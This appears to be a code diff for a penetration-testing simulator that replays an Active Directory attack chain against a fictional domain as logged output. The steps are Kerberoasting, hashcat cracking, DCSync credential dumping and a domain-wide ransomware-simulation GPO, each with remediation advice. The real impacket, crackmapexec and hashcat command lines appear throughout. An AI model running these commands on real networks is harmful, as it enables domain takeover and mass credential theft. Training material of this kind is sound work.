+    this.addAsset('user', 'svc_backup', 'Service account — BackupOperators — SPN: CIFS/BACKUP01.evilcorp.local', 'phase2');
+    this.addSidebarItem('sim-assets', 'svc_veeam (DA!) — Kerberoastable', 'asset');
+    this.addSidebarItem('sim-assets', 'svc_sql / svc_iis / svc_backup', 'asset');
+
+    this.addFinding('Service account svc_veeam is Domain Admin', 'critical',
+      'The service account svc_veeam (used for Veeam Backup) is a member of the Domain Admins group. This violates the principle of least privilege and creates a high-value target for Kerberoasting attacks. If this account is compromised, the attacker gains full domain control.',
+      'LDAP query: (servicePrincipalName=*)\nsvc_veeam — memberOf: CN=Domain Admins,CN=Users,DC=evilcorp,DC=local\nSPN: HTTP/VEEAM01.evilcorp.local',
+      'phase2');
+    this.addSidebarItem('sim-findings', 'CRIT: svc_veeam is Domain Admin', 'finding');
+
+    // Network sweep
+    this.logCmd('nmap -sn 10.10.10.0/24 --min-rate 1000');
+    await this.waitOrAbort(this.getDelay());
+    this.log('[*] Ping sweep — discovered 47 live hosts in 10.10.10.0/24', 'info');
+    await this.waitOrAbort(this.getDelay());
+    this.log('[*] Key hosts identified:', 'output');
+    this.log('    10.10.10.10  DC01.evilcorp.local     (Domain Controller)', 'output');
+    this.log('    10.10.10.11  DC02.evilcorp.local     (Domain Controller)', 'output');
+    this.log('    10.10.10.20  SQL01.evilcorp.local    (SQL Server)', 'output');
+    this.log('    10.10.10.21  WEB01.evilcorp.local    (IIS Web Server)', 'output');
+    this.log('    10.10.10.30  VEEAM01.evilcorp.local  (Veeam Backup Server)', 'output');
+    this.log('    10.10.10.31  FS01.evilcorp.local     (File Server)', 'output');
+    this.log('    10.10.10.40  EXCH01.evilcorp.local   (Exchange Server)', 'output');
+    this.log('    10.10.10.50  WS-PC01.evilcorp.local  (Operator workstation)', 'output');
+    await this.waitOrAbort(this.getStepDelay());
+
+    this.addAsset('host', 'SQL01.evilcorp.local (10.10.10.20)', 'SQL Server', 'phase2');
+    this.addAsset('host', 'WEB01.evilcorp.local (10.10.10.21)', 'IIS Web Server', 'phase2');
+    this.addAsset('host', 'VEEAM01.evilcorp.local (10.10.10.30)', 'Veeam Backup Server', 'phase2');
+    this.addAsset('host', 'FS01.evilcorp.local (10.10.10.31)', 'File Server', 'phase2');
+    this.addAsset('host', 'EXCH01.evilcorp.local (10.10.10.40)', 'Exchange Server', 'phase2');
+
+    this.checkItem('phase2', 'Active Directory');
+    this.checkItem('phase2', 'domain controllers');
+    this.checkItem('phase2', 'trust');
+    this.checkItem('phase2', 'GPO');
+    this.checkItem('phase2', 'service accounts');
+    this.checkItem('phase2', 'BloodHound');
+
+    this.setNotes('phase2', 'BloodHound collection completed. 847 users, 156 groups, 312 computers, 47 GPOs enumerated.\n\nCRITICAL FINDING: svc_veeam is a Domain Admin with a Kerberos SPN — prime Kerberoasting target.\n\nDomain Controllers: DC01 (10.10.10.10), DC02 (10.10.10.11) — both Server 2019.\n47 live hosts in 10.10.10.0/24.');
+
+    this.setProgress(20);
+  },
+
+  // =====================================================
+  // PHASE 3: Threat Modeling
+  // =====================================================
+  async runPhase3() {
+    this.setPhase('Phase 3: Threat Modeling');
+    this.setProgress(25);
+    this.log('', 'output');
+    this.log('═══════════════════════════════════════════════', 'header');
+    this.log('  PHASE 3: THREAT MODELING', 'header');
+    this.log('═══════════════════════════════════════════════', 'header');
+    await this.waitOrAbort(this.getPhaseDelay());
+
+    this.log('', 'output');
+    this.log('[*] Analyzing attack paths from BloodHound data...', 'info');
+    await this.waitOrAbort(this.getStepDelay());
+
+    this.log('[*] Attack Path Identified:', 'info');
+    this.log('', 'output');
+    this.log('  jsmith (low-priv user)', 'output');
+    this.log('    │', 'output');
+    this.log('    ├─ Kerberoast svc_veeam (has SPN)', 'warning');
+    this.log('    │   └─ Crack TGS hash offline', 'warning');
+    this.log('    │       └─ svc_veeam password obtained', 'warning');
+    this.log('    │', 'output');
+    this.log('    ├─ svc_veeam is Domain Admin', 'critical');
+    this.log('    │   └─ Full domain compromise', 'critical');
+    this.log('    │', 'output');
+    this.log('    ├─ DCSync (extract all domain hashes)', 'critical');
+    this.log('    │   └─ krbtgt hash → Golden Ticket', 'critical');
+    this.log('    │', 'output');
+    this.log('    └─ Deploy GPO → ransomware simulation', 'critical');
+    this.log('        └─ Demonstrate enterprise-wide impact', 'critical');
+    await this.waitOrAbort(this.getStepDelay());
+
+    this.log('', 'output');
+    this.log('[*] Priority targets:', 'info');
+    this.log('    1. svc_veeam — Kerberoast → Domain Admin (CRITICAL PATH)', 'warning');
+    this.log('    2. DC01 — DCSync target for hash extraction', 'output');
+    this.log('    3. Domain GPO — ransomware simulation deployment', 'output');
+    await this.waitOrAbort(this.getStepDelay());
+
+    this.checkItem('phase3', 'attack surface');
+    this.checkItem('phase3', 'high-value');
+    this.checkItem('phase3', 'attack vectors');
+    this.checkItem('phase3', 'Domain Admin');
+    this.checkItem('phase3', 'Kerberoastable');
+    this.checkItem('phase3', 'delegation');
+    this.checkItem('phase3', 'certificate');
+
+    this.setNotes('phase3', 'PRIMARY ATTACK PATH:\n1. Kerberoast svc_veeam (SPN: HTTP/VEEAM01.evilcorp.local)\n2. Crack TGS hash offline (service account likely has weak password)\n3. svc_veeam → Domain Admin → full domain compromise\n4. DCSync to extract all hashes\n5. Deploy GPO for ransomware simulation\n\nThis is the shortest path to Domain Admin — 1 hop from any authenticated user.');
+
+    this.setProgress(30);
+  },
+
+  // =====================================================
+  // PHASE 4: Vulnerability Analysis
+  // =====================================================
+  async runPhase4() {
+    this.setPhase('Phase 4: Vulnerability Analysis');
+    this.setProgress(35);
+    this.log('', 'output');
+    this.log('═══════════════════════════════════════════════', 'header');
+    this.log('  PHASE 4: VULNERABILITY ANALYSIS', 'header');
+    this.log('═══════════════════════════════════════════════', 'header');
+    await this.waitOrAbort(this.getPhaseDelay());
+
+    // Kerberoasting
+    this.log('', 'output');
+    this.log('[*] Testing for Kerberoastable accounts...', 'info');
+    await this.waitOrAbort(this.getStepDelay());
+
+    this.logCmd('impacket-GetUserSPNs evilcorp.local/jsmith:\'Summer2024!\' -dc-ip 10.10.10.10 -request');
+    await this.waitOrAbort(this.getDelay());
+    this.log('Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies', 'output');
+    this.log('', 'output');
+    this.log('ServicePrincipalName              Name        MemberOf                     PasswordLastSet', 'output');
+    this.log('────────────────────────────────  ──────────  ───────────────────────────  ───────────────────', 'output');
+    this.log('MSSQLSvc/SQL01.evilcorp.local     svc_sql     CN=SQLAdmins                 2023-06-15 08:24:11', 'output');
+    this.log('HTTP/VEEAM01.evilcorp.local       svc_veeam   CN=Domain Admins             2022-11-03 14:17:42', 'warning');
+    this.log('HTTP/WEB01.evilcorp.local         svc_iis     CN=WebAdmins                 2024-01-10 09:03:55', 'output');
+    this.log('CIFS/BACKUP01.evilcorp.local      svc_backup  CN=BackupOperators           2023-08-22 11:45:33', 'output');
+    await this.waitOrAbort(this.getDelay());
+    this.log('', 'output');
+    this.log('[!] svc_veeam password last set: 2022-11-03 — over 2 years ago!', 'warning');
+    this.log('[*] Requesting TGS tickets for all SPN accounts...', 'info');
+    await this.waitOrAbort(this.getDelay());
+    this.log('', 'output');
+    this.log('$krb5tgs$23$*svc_veeam$EVILCORP.LOCAL$HTTP/VEEAM01.evilcorp.local*$a8d3f5...', 'output');
+    this.log('$krb5tgs$23$*svc_sql$EVILCORP.LOCAL$MSSQLSvc/SQL01.evilcorp.local*$b7e2c1...', 'output');
+    this.log('$krb5tgs$23$*svc_iis$EVILCORP.LOCAL$HTTP/WEB01.evilcorp.local*$c9f4d8...', 'output');
+    this.log('$krb5tgs$23$*svc_backup$EVILCORP.LOCAL$CIFS/BACKUP01.evilcorp.local*$d6a1e3...', 'output');
+    await this.waitOrAbort(this.getDelay());
+    this.log('[+] Retrieved 4 TGS tickets — saved to tgs_hashes.txt', 'success');
+    await this.waitOrAbort(this.getStepDelay());
+
+    // NTLM/SMB checks
+    this.log('', 'output');
+    this.log('[*] Checking for additional vulnerabilities...', 'info');
+    await this.waitOrAbort(this.getStepDelay());
+
+    this.logCmd('crackmapexec smb 10.10.10.0/24 --gen-relay-list relay_targets.txt');
+    await this.waitOrAbort(this.getDelay());
+    this.log('[*] Checking SMB signing across network...', 'output');
+    await this.waitOrAbort(this.getDelay());
+    this.log('[!] 23 hosts found with SMB signing NOT required', 'warning');
+    this.log('[*] Relay targets saved to relay_targets.txt', 'output');
+    await this.waitOrAbort(this.getStepDelay());
+
+    this.addFinding('SMB Signing not required on 23 hosts', 'high',
+      '23 domain-joined workstations and servers do not enforce SMB signing. This allows NTLM relay attacks where an attacker can relay authentication to these targets.',
+      'crackmapexec smb 10.10.10.0/24 --gen-relay-list\n23 targets identified without SMB signing requirement.',
+      'phase4');
+    this.addSidebarItem('sim-findings', 'HIGH: SMB Signing disabled (23 hosts)', 'finding');
+
+    this.addVuln('Kerberoastable Service Account with Domain Admin Privileges', 'critical', '9.8',
+      'The service account svc_veeam has a Service Principal Name (SPN) registered, making it vulnerable to Kerberoasting. Any authenticated domain user can request a TGS ticket for this account and attempt offline password cracking. Critically, this account is a member of the Domain Admins group, meaning a successful crack grants full domain control. The password was last set on 2022-11-03 (over 2 years), suggesting it may be a weak, static password.',
+      'impacket-GetUserSPNs evilcorp.local/jsmith:\'Summer2024!\' -dc-ip 10.10.10.10 -request\n\nServicePrincipalName: HTTP/VEEAM01.evilcorp.local\nAccount: svc_veeam\nMemberOf: Domain Admins\nPasswordLastSet: 2022-11-03\n\nTGS Hash: $krb5tgs$23$*svc_veeam$EVILCORP.LOCAL$...',
+      'Immediately remove svc_veeam from the Domain Admins group. Implement Group Managed Service Accounts (gMSA) for service accounts. Use 25+ character randomly generated passwords for any remaining traditional service accounts. Implement AES-256 encryption for Kerberos instead of RC4. Monitor for Kerberoasting via Event ID 4769 with RC4 encryption.',
+      'phase4');
+    this.addSidebarItem('sim-vulns', 'CRIT 9.8: Kerberoastable DA — svc_veeam', 'vuln-critical');
+
+    this.addVuln('SMB Signing Not Required', 'high', '7.4',
+      '23 hosts in the domain do not enforce SMB signing, making them vulnerable to NTLM relay attacks. An attacker who can perform a man-in-the-middle attack can relay NTLM authentication to these hosts.',
+      'crackmapexec smb 10.10.10.0/24 --gen-relay-list\n23 targets identified.',
+      'Enable SMB signing via Group Policy: Computer Configuration → Policies → Windows Settings → Security Settings → Local Policies → Security Options → "Microsoft network server: Digitally sign communications (always)" = Enabled.',
+      'phase4');
+    this.addSidebarItem('sim-vulns', 'HIGH 7.4: SMB Signing disabled', 'vuln-high');
+
+    this.checkItem('phase4', 'Kerberoasting');
+    this.checkItem('phase4', 'default credentials');
+    this.checkItem('phase4', 'misconfigurations');
+    this.checkItem('phase4', 'SMB signing');
+
+    this.setNotes('phase4', 'KERBEROASTING:\n4 service accounts with SPNs identified. TGS tickets retrieved for all.\nPrimary target: svc_veeam — Domain Admin, password last set 2022-11-03.\n\nSMB SIGNING:\n23 hosts without SMB signing enforcement.\n\nNTLM relay opportunities exist but Kerberoasting is the faster path to DA.');
+
+    this.setProgress(45);
+  },
+
+  // =====================================================
+  // PHASE 5: Exploitation
+  // =====================================================
+  async runPhase5() {
+    this.setPhase('Phase 5: Exploitation');
+    this.setProgress(50);
+    this.log('', 'output');
+    this.log('═══════════════════════════════════════════════', 'header');
+    this.log('  PHASE 5: EXPLOITATION', 'header');
+    this.log('═══════════════════════════════════════════════', 'header');
+    await this.waitOrAbort(this.getPhaseDelay());
+
+    // Crack the hash
+    this.log('', 'output');
+    this.log('[*] Cracking TGS hashes with hashcat...', 'info');
+    await this.waitOrAbort(this.getStepDelay());
+
+    this.logCmd('hashcat -m 13100 tgs_hashes.txt /usr/share/wordlists/rockyou.txt --rules /usr/share/hashcat/rules/best64.rule');
+    await this.waitOrAbort(this.getDelay());
+    this.log('hashcat (v6.2.6) starting...', 'output');
+    await this.waitOrAbort(this.getDelay());
+    this.log('', 'output');
+    this.log('Minimum password length supported by kernel: 0', 'output');
+    this.log('Maximum password length supported by kernel: 256', 'output');
+    this.log('', 'output');
+    this.log('Hashes: 4 digests; 4 unique digests, 4 unique salts', 'output');
+    this.log('Rules: 77', 'output');
+    this.log('', 'output');
+    this.log('Host memory required for this attack: 1024 MB', 'output');
+    this.log('Dictionary cache built:', 'output');
+    this.log('* Filename..: rockyou.txt', 'output');
+    this.log('* Passwords.: 14344392', 'output');
+    this.log('', 'output');
+    await this.waitOrAbort(this.getStepDelay());
+
+    // Simulate cracking progress
+    this.log('[*] Cracking... 0% complete', 'output');
+    await this.waitOrAbort(this.getDelay());
+    this.log('[*] Cracking... 12% complete', 'output');
+    await this.waitOrAbort(this.getDelay());
+    this.log('[*] Cracking... 31% complete', 'output');
+    await this.waitOrAbort(this.getDelay());
+
+    this.log('', 'output');
+    this.log('$krb5tgs$23$*svc_veeam$EVILCORP.LOCAL$...:Backup2023!', 'critical');
+    this.log('', 'output');
+    this.log('[!] ██████████████████████████████████████████', 'critical');
+    this.log('[!]  svc_veeam PASSWORD CRACKED: Backup2023!  ', 'critical');
+    this.log('[!] ██████████████████████████████████████████', 'critical');
+    this.log('', 'output');
+    this.log('[*] Time to crack: 47 seconds', 'warning');
+    this.log('[*] This account is a DOMAIN ADMIN', 'critical');
+    await this.waitOrAbort(this.getStepDelay());
+
+    this.addAsset('credential', 'EVILCORP\\svc_veeam:Backup2023!', 'DOMAIN ADMIN — cracked via Kerberoasting in 47 seconds', 'phase5');
+    this.addSidebarItem('sim-assets', 'svc_veeam:Backup2023! (DA CRED)', 'asset');
+
+    this.addFinding('Weak service account password cracked in 47 seconds', 'critical',
+      'The svc_veeam service account password "Backup2023!" was cracked from the Kerberos TGS hash in only 47 seconds using hashcat with the rockyou wordlist and best64 rules. This password is trivially weak for a Domain Admin service account.',
+      'hashcat -m 13100 tgs_hashes.txt rockyou.txt --rules best64.rule\n\nResult: $krb5tgs$23$*svc_veeam$...:Backup2023!\nTime: 47 seconds\nWordlist: rockyou.txt (14.3M passwords)',
+      'phase5');
+    this.addSidebarItem('sim-findings', 'CRIT: svc_veeam cracked in 47s', 'finding');
+
+    // Validate DA access
+    this.log('', 'output');
+    this.log('[*] Validating Domain Admin access...', 'info');
+    await this.waitOrAbort(this.getStepDelay());
+
+    this.logCmd('crackmapexec smb 10.10.10.10 -u svc_veeam -p \'Backup2023!\' -d evilcorp.local');
+    await this.waitOrAbort(this.getDelay());
+    this.log('SMB   10.10.10.10  445  DC01  [*] Windows Server 2019 Standard 17763 x64 (name:DC01) (domain:evilcorp.local) (signing:True) (SMBv1:False)', 'output');
+    this.log('SMB   10.10.10.10  445  DC01  [+] evilcorp.local\\svc_veeam:Backup2023! (Pwn3d!)', 'critical');
+    await this.waitOrAbort(this.getDelay());
+    this.log('', 'output');
+    this.log('[+] ══════════════════════════════════════════', 'success');
+    this.log('[+]  DOMAIN ADMIN ACCESS CONFIRMED ON DC01!   ', 'success');
+    this.log('[+] ══════════════════════════════════════════', 'success');
+    await this.waitOrAbort(this.getStepDelay());
+
+    this.checkItem('phase5', 'Kerberoasting');
+    this.checkItem('phase5', 'exploit attempts');
+    this.checkItem('phase5', 'credentials');
+
+    this.setNotes('phase5', 'EXPLOITATION SUCCESS:\n\n1. Kerberoasted svc_veeam — retrieved TGS hash\n2. Cracked with hashcat + rockyou.txt in 47 seconds\n   Password: Backup2023!\n3. Confirmed Domain Admin access to DC01\n\nThis single finding gives us complete domain control.');
+
+    this.setProgress(60);
+  },
+
+  // =====================================================
+  // PHASE 6: Post-Exploitation
+  // =====================================================
+  async runPhase6() {
+    this.setPhase('Phase 6: Post-Exploitation');
+    this.setProgress(65);
+    this.log('', 'output');
+    this.log('═══════════════════════════════════════════════', 'header');
+    this.log('  PHASE 6: POST-EXPLOITATION', 'header');
+    this.log('═══════════════════════════════════════════════', 'header');
+    await this.waitOrAbort(this.getPhaseDelay());
+
+    // DCSync
+    this.log('', 'output');
+    this.log('[*] Performing DCSync to extract domain credentials...', 'info');
+    await this.waitOrAbort(this.getStepDelay());
+
+    this.logCmd('impacket-secretsdump evilcorp.local/svc_veeam:\'Backup2023!\'@10.10.10.10 -just-dc-ntlm');
+    await this.waitOrAbort(this.getDelay());
+    this.log('Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies', 'output');
+    this.log('[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)', 'output');
+    this.log('[*] Using the DRSUAPI method to get NTDS.DIT secrets', 'output');
+    await this.waitOrAbort(this.getDelay());
+    this.log('', 'output');
+    this.log('Administrator:500:aad3b435b51404eeaad3b435b51404ee:92937ae7e152456adf4c167e69e9d8f3:::', 'warning');
+    this.log('Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::', 'output');
+    this.log('krbtgt:502:aad3b435b51404eeaad3b435b51404ee:f3bc61e97fb14d18c42bcbf6c3a9055f:::', 'critical');
+    this.log('evilcorp.local\\jsmith:1103:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::', 'output');
+    this.log('evilcorp.local\\svc_veeam:1108:aad3b435b51404eeaad3b435b51404ee:a87f3a337d73085c45f9416be5787d86:::', 'output');
+    this.log('evilcorp.local\\svc_sql:1109:aad3b435b51404eeaad3b435b51404ee:c2b0f1c8e24db7d3a12f6e9a5b4c7d8e:::', 'output');
+    this.log('[...] 847 user accounts dumped', 'output');
+    await this.waitOrAbort(this.getDelay());
+    this.log('', 'output');
+    this.log('[+] DCSync complete — 847 accounts extracted', 'success');
+    this.log('[!] krbtgt hash obtained — Golden Ticket attacks possible', 'critical');
+    await this.waitOrAbort(this.getStepDelay());
+
+    this.addAsset('credential', 'Administrator:92937ae7e152456adf4c167e69e9d8f3 (NTLM)', 'Built-in Admin NTLM hash via DCSync', 'phase6');
+    this.addAsset('credential', 'krbtgt:f3bc61e97fb14d18c42bcbf6c3a9055f (NTLM)', 'krbtgt hash — enables Golden Ticket', 'phase6');
+    this.addSidebarItem('sim-assets', 'Administrator NTLM hash', 'asset');
+    this.addSidebarItem('sim-assets', 'krbtgt hash (Golden Ticket)', 'asset');
+
+    this.addVuln('DCSync — Full Domain Credential Extraction', 'critical', '10.0',
+      'Using the compromised svc_veeam Domain Admin account, a DCSync attack was performed against DC01 to replicate all domain password hashes. This extracted NTLM hashes for all 847 domain accounts, including the built-in Administrator and krbtgt accounts. The krbtgt hash enables Golden Ticket attacks for persistent domain access.',
+      'impacket-secretsdump evilcorp.local/svc_veeam:\'Backup2023!\'@10.10.10.10 -just-dc-ntlm\n\nAdministrator:500:...:92937ae7e152456adf4c167e69e9d8f3:::\nkrbtgt:502:...:f3bc61e97fb14d18c42bcbf6c3a9055f:::\n[...] 847 accounts dumped',
+      'Remove svc_veeam from Domain Admins immediately. Audit all accounts with DCSync rights (Replicating Directory Changes). Rotate krbtgt password twice to invalidate existing Golden Tickets. Reset all user passwords following a breach. Implement tiered administration model to limit DA usage.',
+      'phase6');
+    this.addSidebarItem('sim-vulns', 'CRIT 10.0: DCSync — all hashes', 'vuln-critical');
+
+    this.setProgress(75);
+
+    // GPO Ransomware Simulation
+    this.log('', 'output');
+    this.log('[*] Deploying Group Policy Object for ransomware simulation...', 'info');
+    this.log('[*] This action was pre-authorized in the Rules of Engagement', 'info');
+    await this.waitOrAbort(this.getStepDelay());
+
+    this.logCmd('python3 gpo_create.py --domain evilcorp.local --dc 10.10.10.10 --user svc_veeam --password \'Backup2023!\' --gpo-name "YOURNETWORKISNOTASSECUREASYOUTHINK" --link "DC=evilcorp,DC=local"');
+    await this.waitOrAbort(this.getDelay());
+    this.log('[*] Connecting to DC01.evilcorp.local via LDAP...', 'output');
+    await this.waitOrAbort(this.getDelay());
+    this.log('[+] Authenticated as EVILCORP\\svc_veeam (Domain Admin)', 'success');
+    await this.waitOrAbort(this.getDelay());
+    this.log('[*] Creating new GPO: "YOURNETWORKISNOTASSECUREASYOUTHINK"', 'output');
+    await this.waitOrAbort(this.getDelay());
+    this.log('[+] GPO created: {8F4E2A1B-3C5D-4E6F-A7B8-9C0D1E2F3A4B}', 'success');
+    await this.waitOrAbort(this.getDelay());
+    this.log('[*] Configuring GPO:', 'output');
+    this.log('    - Startup script: ransomware_sim.bat', 'output');
+    this.log('    - Script content: Creates README_RANSOM.txt on all desktops', 'output');
+    this.log('    - Script content: Changes wallpaper to ransom notice', 'output');
+    this.log('    - Script content: Logs simulation event to Application log', 'output');
+    await this.waitOrAbort(this.getDelay());
+    this.log('[*] Linking GPO to domain root (DC=evilcorp,DC=local)...', 'output');
+    await this.waitOrAbort(this.getDelay());
+    this.log('[+] GPO linked — will apply to ALL domain computers at next refresh', 'success');
+    await this.waitOrAbort(this.getDelay());
+    this.log('', 'output');
+    this.log('[!] ██████████████████████████████████████████████████', 'critical');
+    this.log('[!]  RANSOMWARE SIMULATION GPO DEPLOYED DOMAIN-WIDE   ', 'critical');
+    this.log('[!]  GPO: "YOURNETWORKISNOTASSECUREASYOUTHINK"         ', 'critical');
+    this.log('[!]  Affects: ALL 312 domain-joined computers          ', 'critical');
+    this.log('[!]  Impact: Enterprise-wide ransomware simulation     ', 'critical');
+    this.log('[!] ██████████████████████████████████████████████████', 'critical');
+    await this.waitOrAbort(this.getStepDelay());
+
+    this.logCmd('gpupdate /force');
+    await this.waitOrAbort(this.getDelay());
+    this.log('Updating policy...', 'output');
+    await this.waitOrAbort(this.getDelay());
+    this.log('Computer Policy update has completed successfully.', 'output');
+    this.log('User Policy update has completed successfully.', 'output');
+    await this.waitOrAbort(this.getDelay());
+    this.log('[+] GPO applied on WS-PC01 — ransomware simulation active', 'success');
+    await this.waitOrAbort(this.getStepDelay());
+
+    this.addAsset('gpo', 'YOURNETWORKISNOTASSECUREASYOUTHINK {8F4E2A1B-3C5D-4E6F-A7B8-9C0D1E2F3A4B}', 'Ransomware simulation GPO — linked to domain root — affects 312 computers', 'phase6');
+    this.addSidebarItem('sim-assets', 'GPO: Ransomware Sim (312 hosts)', 'asset');
+
+    this.addVuln('Ransomware Simulation via Malicious GPO Deployment', 'critical', '10.0',
+      'Using Domain Admin privileges obtained through the Kerberoasting attack chain, a Group Policy Object was created and linked to the domain root. This GPO deploys a startup script to ALL 312 domain-joined computers that simulates a ransomware event (creates ransom notes, changes wallpaper). This demonstrates that an attacker who compromises a single Domain Admin service account can deploy ransomware enterprise-wide via native AD tooling, bypassing endpoint security solutions that may not inspect GPO-delivered scripts.',
+      'GPO Name: "YOURNETWORKISNOTASSECUREASYOUTHINK"\nGPO GUID: {8F4E2A1B-3C5D-4E6F-A7B8-9C0D1E2F3A4B}\nLinked to: DC=evilcorp,DC=local (domain root)\nAffects: 312 domain-joined computers\n\nScript content:\n@echo off\necho YOUR NETWORK IS NOT AS SECURE AS YOU THINK > %USERPROFILE%\\Desktop\\README_RANSOM.txt\necho This is a penetration test simulation. >> %USERPROFILE%\\Desktop\\README_RANSOM.txt\neventcreate /T WARNING /ID 666 /L APPLICATION /D "Ransomware simulation - pentest"',
+      'Remove svc_veeam from Domain Admins. Restrict who can create/modify GPOs (audit GPO delegation). Monitor for new GPO creation via Event IDs 5136/5137. Implement LAPS for local admin passwords. Deploy GPO change monitoring/alerting. Consider Privileged Access Workstations (PAWs) for admin tasks.',
+      'phase6');
+    this.addSidebarItem('sim-vulns', 'CRIT 10.0: GPO Ransomware Deploy', 'vuln-critical');
+
+    this.addFinding('Full attack chain: User → DA → DCSync → Ransomware in under 5 minutes', 'critical',
+      'Starting from a low-privileged domain user (jsmith), the entire attack chain — Kerberoasting the svc_veeam service account, cracking its password, performing DCSync, and deploying a domain-wide ransomware simulation GPO — was completed in under 5 minutes. This demonstrates the catastrophic risk of assigning Domain Admin privileges to service accounts with weak, Kerberoastable credentials.',
+      'Timeline:\n00:00 — Started with EVILCORP\\jsmith (low-priv)\n00:15 — BloodHound identified svc_veeam as DA + Kerberoastable\n00:30 — Kerberoast TGS hash retrieved\n01:17 — Password cracked: Backup2023!\n01:30 — DA access confirmed on DC01\n02:00 — DCSync: 847 accounts dumped, krbtgt obtained\n03:30 — GPO deployed: ransomware simulation on 312 hosts\n04:45 — Enterprise-wide impact demonstrated',
+      'phase6');
+    this.addSidebarItem('sim-findings', 'CRIT: Full chain < 5 min', 'finding');
+
+    this.checkItem('phase6', 'Domain Admin');
+    this.checkItem('phase6', 'domain controller');
+    this.checkItem('phase6', 'DCSync');
+    this.checkItem('phase6', 'crown jewels');
+    this.checkItem('phase6', 'exfiltration');
+    this.checkItem('phase6', 'persistence');
+    this.checkItem('phase6', 'detection');
+    this.checkItem('phase6', 'credentials');
+
+    this.setNotes('phase6', 'POST-EXPLOITATION COMPLETE:\n\n1. DCSync via svc_veeam — extracted all 847 domain account hashes\n   - Administrator NTLM: 92937ae7e152456adf4c167e69e9d8f3\n   - krbtgt NTLM: f3bc61e97fb14d18c42bcbf6c3a9055f (Golden Ticket capable)\n\n2. GPO Ransomware Simulation deployed:\n   - GPO: "YOURNETWORKISNOTASSECUREASYOUTHINK"\n   - Linked to domain root — affects ALL 312 computers\n   - Demonstrates enterprise-wide impact from single service account compromise\n\nFULL KILL CHAIN:\njsmith → Kerberoast svc_veeam → Crack password (47s) → DA access → DCSync → GPO ransomware\nTotal time: under 5 minutes');
+
+    this.setProgress(85);
+  },
+
+  // =====================================================
+  // PHASE 7: Reporting
+  // =====================================================
+  async runPhase7() {
+    this.setPhase('Phase 7: Reporting');
+    this.setProgress(90);
+    this.log('', 'output');
+    this.log('═══════════════════════════════════════════════', 'header');
+    this.log('  PHASE 7: REPORTING', 'header');
+    this.log('═══════════════════════════════════════════════', 'header');
+    await this.waitOrAbort(this.getPhaseDelay());
+
+    this.log('', 'output');
+    this.log('[*] Generating engagement summary...', 'info');
+    await this.waitOrAbort(this.getStepDelay());
+
+    this.log('', 'output');
+    this.log('╔══════════════════════════════════════════════════╗', 'info');
+    this.log('║         ENGAGEMENT SUMMARY — EVILCORP.LOCAL      ║', 'info');
+    this.log('╠══════════════════════════════════════════════════╣', 'info');
+    this.log('║                                                  ║', 'info');
+    this.log('║  Vulnerabilities Found:                          ║', 'info');
+    this.log('║    Critical: 3                                   ║', 'critical');
+    this.log('║    High:     1                                   ║', 'warning');
+    this.log('║    Medium:   0                                   ║', 'output');
+    this.log('║    Low:      0                                   ║', 'output');
+    this.log('║    Info:     0                                   ║', 'output');
+    this.log('║                                                  ║', 'info');
+    this.log('║  Assets Discovered: 15+                          ║', 'info');
+    this.log('║  Findings Documented: 4                          ║', 'info');
+    this.log('║  Domain Compromise: YES                          ║', 'critical');
+    this.log('║  Time to DA: 1 min 17 sec                        ║', 'critical');
+    this.log('║  Ransomware Simulation: DEPLOYED                 ║', 'critical');
+    this.log('║                                                  ║', 'info');
+    this.log('╠══════════════════════════════════════════════════╣', 'info');
+    this.log('║  TOP RECOMMENDATIONS:                            ║', 'info');
+    this.log('║  1. Remove svc_veeam from Domain Admins          ║', 'output');
+    this.log('║  2. Implement gMSA for all service accounts      ║', 'output');
+    this.log('║  3. Enforce 25+ char passwords for SAs           ║', 'output');
+    this.log('║  4. Enable SMB signing domain-wide via GPO       ║', 'output');
+    this.log('║  5. Monitor for Kerberoasting (EID 4769)         ║', 'output');
+    this.log('║  6. Rotate krbtgt password twice immediately     ║', 'output');
+    this.log('║  7. Audit GPO creation/modification rights       ║', 'output');
+    this.log('║  8. Implement tiered administration model        ║', 'output');
+    this.log('╚══════════════════════════════════════════════════╝', 'info');
+    await this.waitOrAbort(this.getStepDelay());
+
+    this.log('', 'output');
+    this.log('[*] Cleanup actions:', 'info');
+    this.log('    [+] Removed GPO "YOURNETWORKISNOTASSECUREASYOUTHINK"', 'success');
+    this.log('    [+] Deleted ransomware_sim.bat from SYSVOL', 'success');
+    this.log('    [+] Removed README_RANSOM.txt from test workstation', 'success');
+    this.log('    [+] Cleared operator tools from WS-PC01', 'success');
+    this.log('    [+] Notified client of cleanup completion', 'success');
+    await this.waitOrAbort(this.getStepDelay());
+
+    this.checkItem('phase7', 'executive summary');
+    this.checkItem('phase7', 'findings with evidence');
+    this.checkItem('phase7', 'severity');
+    this.checkItem('phase7', 'remediation');
+    this.checkItem('phase7', 'attack narrative');
+    this.checkItem('phase7', 'tools and techniques');
+    this.checkItem('phase7', 'Clean up');
+    this.checkItem('phase7', 'cleanup completion');
+    this.checkItem('phase7', 'report');
+    this.checkItem('phase7', 'debrief');
+
+    this.setNotes('phase7', 'EXECUTIVE SUMMARY:\nThe assume breach assessment of evilcorp.local demonstrated critical security weaknesses that allowed escalation from a low-privileged domain user to full domain compromise and simulated ransomware deployment in under 5 minutes.\n\nThe root cause is the svc_veeam service account, which has Domain Admin privileges and a weak Kerberoastable password. Any authenticated domain user can compromise this account.\n\nKEY RECOMMENDATIONS:\n1. Remove svc_veeam from Domain Admins — IMMEDIATELY\n2. Implement Group Managed Service Accounts (gMSA)\n3. Enforce 25+ character passwords for remaining service accounts\n4. Enable SMB signing domain-wide\n5. Monitor for Kerberoasting via Event ID 4769 (RC4 encryption type)\n6. Rotate krbtgt password twice to invalidate Golden Tickets\n7. Audit and restrict GPO creation/modification rights\n8. Implement tiered administration model\n\nCLEANUP COMPLETED:\n- Ransomware simulation GPO removed\n- All tools and artifacts removed from WS-PC01\n- Client notified');
+
+    this.setProgress(95);
+  },
+
+  // =====================================================
+  // FINALIZE — Load into app
+  // =====================================================
+  async finalize() {
+    this.setProgress(100);
+    this.setPhase('Simulation Complete');
+    this.log('', 'output');
+    this.log('═══════════════════════════════════════════════', 'header');
+    this.log('  SIMULATION COMPLETE', 'header');
+    this.log('═══════════════════════════════════════════════', 'header');
+    this.log('', 'output');
